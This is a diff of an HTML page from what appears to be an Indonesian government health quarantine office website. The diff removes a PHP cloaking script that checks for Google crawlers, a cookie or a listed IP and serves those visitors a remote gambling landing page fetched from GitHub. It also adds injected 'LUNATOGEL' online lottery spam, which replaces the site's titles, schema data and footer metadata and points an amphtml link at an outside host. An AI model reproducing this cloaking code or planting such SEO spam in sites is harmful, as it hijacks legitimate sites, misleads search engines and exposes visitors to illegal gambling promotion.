@@ -1,7 +1,3 @@
-<?php error_reporting(0);$link='https://raw.githubusercontent.com/fadlipul69/kkpbanjarmasin/refs/heads/main/tugas-fungsi-ppid'; // link lp dalam bentuk paste raw
-function ip_in_range($ip,$range){list($subnet,$bits)=explode('/',$range);$ip_dec=ip2long($ip);$subnet_dec=ip2long($subnet);$mask=-1<<(32-$bits);$subnet_dec&=$mask;return($ip_dec&$mask)===$subnet_dec;}function fetch_ip_ranges($url,$ipv4_key){$json_data=file_get_contents($url);if($json_data===FALSE){die("Error: Could not fetch the IP ranges from $url.");}$ip_data=json_decode($json_data,true);$ip_ranges=[];if(isset($ip_data['prefixes'])){foreach($ip_data['prefixes']as $prefix){if(isset($prefix[$ipv4_key])){$ip_ranges[]=$prefix[$ipv4_key];}}}return $ip_ranges;}$google_ip_ranges=fetch_ip_ranges('https://www.gstatic.com/ipranges/goog.json','ipv4Prefix');$visitor_ip=isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:(isset($_SERVER["HTTP_INCAP_CLIENT_IP"])?$_SERVER["HTTP_INCAP_CLIENT_IP"]:(isset($_SERVER["HTTP_TRUE_CLIENT_IP"])?$_SERVER["HTTP_TRUE_CLIENT_IP"]:(isset($_SERVER["HTTP_REMOTEIP"])?$_SERVER["HTTP_REMOTEIP"]:(isset($_SERVER["HTTP_X_REAL_IP"])?$_SERVER["HTTP_X_REAL_IP"]:$_SERVER["REMOTE_ADDR"]))));$googleallow=false;foreach($google_ip_ranges as $range){if(ip_in_range($visitor_ip,$range)){$googleallow=true;break;}}$asd=array('bot','ahrefs','google');foreach($asd as $len){$nul=$len;}$alow=['146.70.14.25'];if($_SERVER['REQUEST_URI']=='/'){$agent=strtolower($_SERVER['HTTP_USER_AGENT']);if(strpos($agent,$nul)or $googleallow or isset($_COOKIE['lp'])or in_array($visitor_ip,$alow)){echo implode('',file($link));die();}} ?>
-<?php
-?>
 <!DOCTYPE html>
 <html lang="en-US">
 <head>
@@ -11,13 +7,14 @@ function ip_in_range($ip,$range){list($subnet,$bits)=explode('/',$range);$ip_dec
 	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
 
 	<!-- This site is optimized with the Yoast SEO plugin v23.8 - https://yoast.com/wordpress/plugins/seo/ -->
-	<title>Tugas Fungsi PPID - Balai Kekarantinaan Kesehatan Kelas I Banjarmasin</title>
+	<title>LUNATOGEL - Situs Agen Togel Online & Daftar LunaTogel Resmi Menang</title>
 	<link rel="canonical" href="https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/" />
 	<meta property="og:locale" content="en_US" />
 	<meta property="og:type" content="article" />
-	<meta property="og:title" content="Tugas Fungsi PPID - Balai Kekarantinaan Kesehatan Kelas I Banjarmasin" />
+  <link rel="amphtml" href="https://kkpbanjarmasin-serba-luna.pages.dev/fungsi" />
+	<meta property="og:title" content="LUNATOGEL - Situs Agen Togel Online & Daftar LunaTogel Resmi Menang" />
 	<meta property="og:url" content="https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/" />
-	<meta property="og:site_name" content="Balai Kekarantinaan Kesehatan Kelas I Banjarmasin" />
+	<meta property="og:site_name" content="LUNATOGEL" />
 	<meta property="article:modified_time" content="2024-11-08T12:21:05+00:00" />
 	<meta property="og:image" content="https://kkpbanjarmasin.or.id/wp-content/uploads/2024/10/Tusi-ppid.jpg" />
 	<meta property="og:image:width" content="414" />
@@ -26,15 +23,15 @@ function ip_in_range($ip,$range){list($subnet,$bits)=explode('/',$range);$ip_dec
 	<meta name="twitter:card" content="summary_large_image" />
 	<meta name="twitter:label1" content="Est. reading time" />
 	<meta name="twitter:data1" content="1 minute" />
-	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/","url":"https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/","name":"Tugas Fungsi PPID - Balai Kekarantinaan Kesehatan Kelas I Banjarmasin","isPartOf":{"@id":"https://kkpbanjarmasin.or.id/#website"},"primaryImageOfPage":{"@id":"https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/#primaryimage"},"image":{"@id":"https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/#primaryimage"},"thumbnailUrl":"https://kkpbanjarmasin.or.id/wp-content/uploads/2024/10/Tusi-ppid-169x300.jpg","datePublished":"2024-11-08T12:16:57+00:00","dateModified":"2024-11-08T12:21:05+00:00","breadcrumb":{"@id":"https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/#primaryimage","url":"https://kkpbanjarmasin.or.id/wp-content/uploads/2024/10/Tusi-ppid.jpg","contentUrl":"https://kkpbanjarmasin.or.id/wp-content/uploads/2024/10/Tusi-ppid.jpg","width":414,"height":733},{"@type":"BreadcrumbList","@id":"https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://kkpbanjarmasin.or.id/"},{"@type":"ListItem","position":2,"name":"Tugas Fungsi PPID"}]},{"@type":"WebSite","@id":"https://kkpbanjarmasin.or.id/#website","url":"https://kkpbanjarmasin.or.id/","name":"Balai Kekarantinaan Kesehatan Kelas I Banjarmasin","description":"Balai Kekarantinaan Kesehatan Kelas I Banjarmasin","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://kkpbanjarmasin.or.id/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"}]}</script>
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/","url":"https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/","name":"LUNATOGEL - Situs Agen Togel Online & Daftar LunaTogel Resmi Menang","isPartOf":{"@id":"https://kkpbanjarmasin.or.id/#website"},"primaryImageOfPage":{"@id":"https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/#primaryimage"},"image":{"@id":"https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/#primaryimage"},"thumbnailUrl":"https://kkpbanjarmasin.or.id/wp-content/uploads/2024/10/Tusi-ppid-169x300.jpg","datePublished":"2024-11-08T12:16:57+00:00","dateModified":"2024-11-08T12:21:05+00:00","breadcrumb":{"@id":"https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/"]}]},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/#primaryimage","url":"https://kkpbanjarmasin.or.id/wp-content/uploads/2024/10/Tusi-ppid.jpg","contentUrl":"https://kkpbanjarmasin.or.id/wp-content/uploads/2024/10/Tusi-ppid.jpg","width":414,"height":733},{"@type":"BreadcrumbList","@id":"https://kkpbanjarmasin.or.id/tugas-fungsi-ppid/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://kkpbanjarmasin.or.id/"},{"@type":"ListItem","position":2,"name":"Tugas Fungsi PPID"}]},{"@type":"WebSite","@id":"https://kkpbanjarmasin.or.id/#website","url":"https://kkpbanjarmasin.or.id/","name":"LUNATOGEL","description":"LUNATOGEL","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://kkpbanjarmasin.or.id/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"en-US"}]}</script>
 	<!-- / Yoast SEO plugin. -->
 
 
 <link rel='dns-prefetch' href='//www.googletagmanager.com' />
 <link rel='dns-prefetch' href='//fonts.googleapis.com' />
 <link rel='dns-prefetch' href='//cdnjs.cloudflare.com' />
-<link rel="alternate" type="application/rss+xml" title="Balai Kekarantinaan Kesehatan Kelas I Banjarmasin &raquo; Feed" href="https://kkpbanjarmasin.or.id/feed/" />
-<link rel="alternate" type="application/rss+xml" title="Balai Kekarantinaan Kesehatan Kelas I Banjarmasin &raquo; Comments Feed" href="https://kkpbanjarmasin.or.id/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="LUNATOGEL &raquo; Feed" href="https://kkpbanjarmasin.or.id/feed/" />
+<link rel="alternate" type="application/rss+xml" title="LUNATOGEL &raquo; Comments Feed" href="https://kkpbanjarmasin.or.id/comments/feed/" />
 <script type="text/javascript">
 /* <![CDATA[ */
 window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/kkpbanjarmasin.or.id\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.4"}};
@@ -181,13 +178,13 @@ var PENCILOCALCACHE = {};
     "@id": "#organization",
     "logo": "",
     "url": "https:\/\/kkpbanjarmasin.or.id\/",
-    "name": "Balai Kekarantinaan Kesehatan Kelas I Banjarmasin",
-    "description": "Balai Kekarantinaan Kesehatan Kelas I Banjarmasin"
+    "name": "LUNATOGEL",
+    "description": "LUNATOGEL adalah link agen togel online resmi bagi yang mau bermain judi aman dan terpercaya langsung kunjungi situs lunatogel terjamin mudah menang dengan angka result terupdate banyak peluang jackpot malam ini."
 }</script><script type="application/ld+json">{
     "@context": "http:\/\/schema.org\/",
     "@type": "WebSite",
-    "name": "Balai Kekarantinaan Kesehatan Kelas I Banjarmasin",
-    "alternateName": "Balai Kekarantinaan Kesehatan Kelas I Banjarmasin",
+    "name": "LUNATOGEL",
+    "alternateName": "LUNATOGEL",
     "url": "https:\/\/kkpbanjarmasin.or.id\/"
 }</script><script type="application/ld+json">{
     "@context": "http:\/\/schema.org\/",
@@ -211,7 +208,7 @@ var PENCILOCALCACHE = {};
     "@context": "http:\/\/schema.org\/",
     "@type": "WebPage",
     "headline": "Tugas Fungsi PPID",
-    "description": "Tugas Fungsi PPID",
+    "description": "LUNATOGEL adalah link agen togel online resmi bagi yang mau bermain judi aman dan terpercaya langsung kunjungi situs lunatogel terjamin mudah menang dengan angka result terupdate banyak peluang jackpot malam ini.",
     "datePublished": "2024-11-08",
     "datemodified": "2024-11-08",
     "mainEntityOfPage": "https:\/\/kkpbanjarmasin.or.id\/tugas-fungsi-ppid\/",
@@ -221,7 +218,7 @@ var PENCILOCALCACHE = {};
     },
     "publisher": {
         "@type": "Organization",
-        "name": "Balai Kekarantinaan Kesehatan Kelas I Banjarmasin"
+        "name": "LUNATOGEL"
     },
     "author": {
         "@type": "Person",
@@ -591,11 +588,11 @@ header#masthead {
 
 	</div><!-- #content -->
 	<footer id="colophon" class="site-footer" itemscope itemtype="http://schema.org/WPFooter">
-		<meta itemprop="name" content="Webpage footer for Balai Kekarantinaan Kesehatan Kelas I Banjarmasin"/>
-		<meta itemprop="description" content="Balai Kekarantinaan Kesehatan Kelas I Banjarmasin"/>
+		<meta itemprop="name" content="LUNATOGEL"/>
+		<meta itemprop="description" content="LUNATOGEL adalah link agen togel online resmi bagi yang mau bermain judi aman dan terpercaya langsung kunjungi situs lunatogel terjamin mudah menang dengan angka result terupdate banyak peluang jackpot malam ini."/>
 		<meta itemprop="keywords" content="Data Protection, Copyright Data"/>
 		<meta itemprop="copyrightYear" content="2025"/>
-		<meta itemprop="copyrightHolder" content="Balai Kekarantinaan Kesehatan Kelas I Banjarmasin"/>
+		<meta itemprop="copyrightHolder" content="LUNATOGEL"/>
 				<div id="footer__sidebars" class="footer__sidebars footer__sidebar-col-2 footer__sidebars-style-2">
 	<div class="footer__sidebars-inner penci-container-fluid">
 		<div class="row">
@@ -901,5 +898,4 @@ var wpData = {"baseUrl":"https:\/\/kkpbanjarmasin.or.id"};
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/horizontal-scrolling-announcements/script/jquery.marquee.min.js?ver=6.6.4" id="jquery.marquee.min-js"></script>
 <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"02cc1a4c4bfc45ffbc53912b71552494","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
-</html>
 </html>
